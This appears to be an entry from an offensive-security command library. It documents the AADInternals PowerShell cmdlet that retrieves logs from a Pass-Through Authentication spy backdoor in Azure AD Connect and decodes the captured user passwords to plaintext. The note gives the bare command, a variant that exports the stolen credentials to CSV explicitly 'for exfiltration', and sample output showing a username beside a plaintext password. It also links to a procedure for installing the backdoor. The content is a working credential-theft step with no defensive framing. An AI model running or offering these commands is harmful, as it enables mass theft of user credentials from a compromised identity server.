---
type: command
executor: powershell
data: Get-AADIntPTASpyLog -DecodePasswords
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - exfiltration
  - credential-access
  - azure-ad
verified: true
validated: true
---

# get-aadint-ptaspy-log-decode-passwords

## Command

```powershell
Get-AADIntPTASpyLog -DecodePasswords
```

## Description

This PowerShell cmdlet retrieves logs from the PTA spy backdoor installed via AADInternals and decodes any captured passwords, outputting authentication events including usernames and plaintext credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -DecodePasswords | Decodes encoded password entries in the logs to plaintext. | Yes |

## Examples

### Basic Usage

```powershell
Get-AADIntPTASpyLog -DecodePasswords
```

Fetches and decodes all available logs.

### Advanced Usage

```powershell
Get-AADIntPTASpyLog -DecodePasswords | Export-Csv -Path "ptalogs.csv" -NoTypeInformation
```

Exports decoded logs to a CSV file for analysis or exfiltration.

## Expected Output

Table or list of log entries, e.g.:

Timestamp          Username    Password
2023-10-01 10:00   user@domain.com  P@ssw0rd123

Empty if no logs or spy not installed.

## Related

- [[procedures/Install-Azure-AD-Connect-PTA-Backdoor-and-Retrieve-Logs]]
- [[commands/install-aadint-ptaspy]]
